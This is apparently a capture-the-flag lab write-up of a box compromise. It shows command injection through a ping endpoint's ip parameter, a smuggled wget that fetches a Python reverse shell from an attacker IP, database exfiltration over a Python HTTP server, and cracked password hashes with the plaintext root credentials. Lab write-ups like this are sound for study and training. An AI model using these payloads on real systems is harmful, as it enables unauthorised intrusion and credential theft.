- Since we can ping our IP, if we can inject our code in IP, we can get a reverse shell [[Enumeration]]

# Python reverse shell
----
- Detection of RCE:
	- **GET /ping?ip=0.0.0.0;**
	- ![[Pasted image 20250501162612.png]]
	- ![[Pasted image 20250501162645.png]]
- Get a reverse shell by putting **python reverse shell code in a file and transferring it**
	- **GET /ping?ip=0.0.0.0;`wget+10.11.135.80/rev.py`**
	- ![[Pasted image 20250501162726.png]]
- `python rev.py`
	- ![[Pasted image 20250501162826.png]]
- ![[Pasted image 20250501162850.png]]

# Post - Enumeration
---
- Found `sqlite.db`file in current directory of `www`user:
	- ![[Pasted image 20250501163026.png]]
- Transfer using `python3 -m http.server`
	- ![[Pasted image 20250501163237.png]]
	- ![[Pasted image 20250501163248.png]]
- Browser using `sqlitebrowser`built in tool:
	- ![[Pasted image 20250501163419.png]]
	- `admin`  `0d0ea5111e3c1def594c1684e3b9be84`: `mrsheafy`
	- `r00t`    `f357a0c52799563c7c7b76c1e7543a32`: `n100906`
	- Cracked using 
		- ![[Pasted image 20250501163914.png]]

# SSH with r00t user:
---
- `r00t`: `n100906`
